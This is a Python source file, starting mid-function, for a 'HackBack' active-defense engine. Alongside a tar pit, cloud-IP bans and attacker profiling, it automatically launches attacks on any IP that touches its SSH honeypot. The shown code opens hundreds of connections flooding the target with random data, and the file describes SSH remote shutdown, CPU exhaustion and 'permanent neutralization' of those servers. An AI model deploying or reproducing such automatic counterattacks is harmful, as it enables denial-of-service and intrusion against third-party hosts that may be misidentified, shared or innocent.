                    asyncio.open_connection(ip, port, ssl=ctx), timeout=5
                )
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, port), timeout=5
                )

            self.flood_connections_opened += 1

            # Send random data chunks to keep the connection busy
            while time.time() < end_time:
                try:
                    data = os.urandom(4096)
                    writer.write(data)
                    await writer.drain()
                    await asyncio.sleep(0.01)
                except Exception:
                    break

            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
        except Exception:
            pass

    # ------------------------------------------------------------------
    # Status & Stats
    # ------------------------------------------------------------------

    def get_stats(self) -> Dict:
        """Get countermeasure statistics"""
        return {
            "active_engagements": len(self._active),
            "active_targets": list(self._active.keys()),
            "total_engaged_ips": list(self._engaged_ips),
            "ssh_attempts": self.ssh_attempts,
            "ssh_successes": self.ssh_successes,
            "servers_shutdown": self.servers_shutdown,
            "servers_neutralized": self.servers_neutralized,
            "cpu_exhaustions_launched": self.cpu_exhaustions_launched,
            "flood_connections_opened": self.flood_connections_opened,
        }


# =================================================================
# HACKBACK PROTOCOL - Active Defense Engine
# =================================================================

class HackBackProtocol:
    """
    Active defense engine that coordinates all counter-measures.

    Integrates with Cerberus for threat detection and adds:
    - Cloud IP instant-ban (zero tolerance for VPS scanners)
    - Tar pit for SSH bots
    - Enhanced attacker profiling
    - Infrastructure countermeasures (SSH shutdown + CPU exhaust of attacker servers)
    - Automatic escalation based on attacker behavior
    """

    def __init__(self, cerberus, log_dir: str = "logs"):
        self.cerberus = cerberus  # DangerousCerberus instance
        self.tar_pit: Optional[TarPit] = None
        self.log_dir = log_dir

        # HackBack settings
        self.enabled = True
        self.cloud_instant_ban = True    # Zero tolerance for cloud IPs
        self.tar_pit_enabled = True      # Trap SSH bots
        self.attacker_profiling = True   # Track everything about attackers

        # Infrastructure countermeasures (SSH shutdown + CPU exhaust of attacker servers)
        self.countermeasures = InfrastructureCountermeasures(
            max_flood_connections=200,
            flood_duration=120,
            log_dir=log_dir,
        )

        # Event loop reference for thread-safe async scheduling (set by server)
        self._loop: Optional[asyncio.AbstractEventLoop] = None

        # Stats
        self.cloud_ips_blocked = 0
        self.instant_bans = 0

        # Setup logging
        os.makedirs(log_dir, exist_ok=True)
        self._hackback_log = os.path.join(log_dir, "hackback.log")
        self._setup_logger()

        logger.warning(
            "[HACKBACK] Protocol initialized - "
            f"cloud_instant_ban={self.cloud_instant_ban}, "
            f"tar_pit={self.tar_pit_enabled}, "
            f"infrastructure_countermeasures=True"
        )

    def _setup_logger(self):
        """Setup dedicated hackback log"""
        self._hb_logger = logging.getLogger('HackBackLog')
        self._hb_logger.setLevel(logging.INFO)
        if not self._hb_logger.handlers:
            handler = logging.FileHandler(self._hackback_log)
            handler.setFormatter(logging.Formatter(
                '%(asctime)s | %(levelname)s | %(message)s'
            ))
            self._hb_logger.addHandler(handler)

    def _log(self, level: str, ip: str, action: str, details: str = ""):
        """Log hackback action"""
        self._hb_logger.warning(
            f"[{level}] IP={ip} | Action={action} | {details}"
        )

    def start_tar_pit(self, port: int = 2222):
        """Start the tar pit on the honeypot port"""
        if not self.tar_pit_enabled:
            return

        self.tar_pit = TarPit(
            host='0.0.0.0',
            port=port,
            delay_min=5.0,    # 5 seconds minimum between lines
            delay_max=20.0,   # Up to 20 seconds
            max_line_length=32,
            max_clients=4096,
            on_connection=self._on_tar_pit_connection,
            on_trapped=self._on_tar_pit_trapped,
        )
        self.tar_pit.start()

    def stop_tar_pit(self):
        """Stop the tar pit"""
        if self.tar_pit:
            self.tar_pit.stop()

    def _on_tar_pit_connection(self, ip: str, port: int):
        """Called when a bot connects to the tar pit (SSH honeypot)"""
        provider = identify_cloud_provider(ip)

        if provider:
            self._log("CLOUD_TRAP", ip,
                       "tar_pit_cloud",
                       f"Cloud provider: {provider}")
            self.cloud_ips_blocked += 1

            # Instant firewall ban for cloud IPs
            if self.cloud_instant_ban and self.cerberus:
                self.cerberus._set_ip_threat(
                    ip, 3,  # THREAT_CERBERUS
                    f"HackBack: Cloud SSH scanner ({provider}) - instant ban"
                )
        else:
            self._log("TRAP", ip, "tar_pit_entry", f"Port: {port}")

        # Launch infrastructure countermeasures against the SSH attacker's server
        # (runs async - scheduled from sync thread via stored event loop)
        reason = f"SSH honeypot attack (provider: {provider or 'direct'})"
        try:
            if self._loop and self._loop.is_running():
                asyncio.run_coroutine_threadsafe(
                    self.countermeasures.engage(
                        ip, reason, permanent=provider is not None,
                    ),
                    self._loop,
                )
                self._log("COUNTERMEASURE", ip, "engaged_from_tar_pit", reason)
        except Exception as e:
            self._log("ERROR", ip, "countermeasure_launch_failed", str(e))

        # Report to Cerberus
        if self.cerberus:
            self.cerberus.honeypot_triggered(ip, f"tar_pit_connection")

    def _on_tar_pit_trapped(self, ip: str, duration: float):
        """Called when a trapped bot finally disconnects"""
        self._log("TRAPPED", ip, "tar_pit_exit",
                   f"Duration: {duration:.1f}s wasted")

        # Profile the attacker
        if self.cerberus and hasattr(self.cerberus, 'ban_db'):
            self.cerberus.ban_db.update_profile(
                ip, attack_type=f"tar_pit_{duration:.0f}s"
            )

    def check_cloud_ip(self, ip: str) -> Optional[str]:
        """
        Check if IP is from cloud infrastructure.
        If yes AND cloud_instant_ban is enabled, ban immediately.
        Returns provider name or None.
        """
        provider = identify_cloud_provider(ip)

        if provider and self.cloud_instant_ban:
            self.cloud_ips_blocked += 1
            self.instant_bans += 1

            self._log("INSTANT_BAN", ip, "cloud_detected",
                       f"Provider: {provider}")

            # Instant ban via Cerberus (firewall + persistent)
            if self.cerberus:
                self.cerberus._set_ip_threat(
                    ip, 3,  # THREAT_CERBERUS
                    f"HackBack: Cloud infrastructure ({provider}) - "
                    f"zero tolerance instant ban"
                )

        return provider

    def process_honeypot_connection(self, ip: str, username: str = "",
                                     password: str = ""):
        """
        Process a honeypot connection through HackBack.
        Called instead of directly calling cerberus.honeypot_triggered().
        Adds cloud detection and enhanced profiling.
        """
        # Check cloud provider FIRST - instant ban
        provider = self.check_cloud_ip(ip)

        if provider:
            logger.warning(
                f"[HACKBACK] Cloud attacker ({provider}): {ip} - "
                f"INSTANT BAN applied"
            )

        # Profile
        if self.attacker_profiling and self.cerberus and hasattr(self.cerberus, 'ban_db'):
            self.cerberus.ban_db.update_profile(
                ip,
                attack_type="honeypot_ssh",
                username=username,
                user_agent=username  # SSH client string
            )

        # Forward to Cerberus (will handle escalation)
        if self.cerberus:
            self.cerberus.honeypot_triggered(ip, username, password)

    def process_titan_net_connection(self, ip: str) -> bool:
        """
        Check a Titan-Net WebSocket connection through HackBack.
        Returns True if connection should be REJECTED.
        """
        # Check cloud provider
        provider = identify_cloud_provider(ip)
        if provider and self.cloud_instant_ban:
            self._log("WS_CLOUD_BLOCK", ip, "titan_net_cloud_reject",
                       f"Provider: {provider}")
            self.cloud_ips_blocked += 1
            return True

        return False

    async def engage_infrastructure(self, ip: str, reason: str,
                                     permanent: bool = False):
        """
        Launch active countermeasures against attacker's server infrastructure.

        Attempts SSH remote shutdown + CPU exhaustion in parallel.
        For cloud VPS and botnet IPs, permanent neutralization is automatic.

        Args:
            ip: Attacker's IP address
            reason: Why this engagement was triggered
            permanent: If True, permanently neutralize (auto-set for cloud/botnet)
        """
        provider = identify_cloud_provider(ip)

        # Cloud infrastructure and botnets get permanent neutralization
        if provider:
            permanent = True

        self._log("ENGAGE", ip, "infrastructure_countermeasure",
                   f"Provider: {provider or 'direct'}, "
                   f"permanent={permanent}, Reason: {reason}")

        await self.countermeasures.engage(ip, reason, permanent)

    def build_ban_message(self, ip: str, reason: str) -> Dict:
        """
        Build a ban/disconnect notification message.
        Sent to the attacker's client session before disconnecting.
        Does NOT trigger any client-side shutdown - just informs and disconnects.
        """
        provider = identify_cloud_provider(ip)
        return {
            "type": "cerberus_ban",
            "reason": reason,
            "threat_level": "CERBERUS",
            "message": (
                "Cerberus Protocol: Your session has been terminated. "
                "Your IP address and attack pattern have been recorded."
            ),
            "attacker_ip": ip,
            "cloud_provider": provider,
            "timestamp": datetime.now().isoformat(),
        }

    def get_status(self) -> Dict:
        """Get HackBack Protocol status"""
        status = {
            "enabled": self.enabled,
            "cloud_instant_ban": self.cloud_instant_ban,
            "tar_pit_enabled": self.tar_pit_enabled,
            "attacker_profiling": self.attacker_profiling,
            "stats": {
                "cloud_ips_blocked": self.cloud_ips_blocked,
                "instant_bans": self.instant_bans,
            },
            "countermeasures": self.countermeasures.get_stats(),
        }

        if self.tar_pit:
            status["tar_pit"] = self.tar_pit.get_stats()

        return status
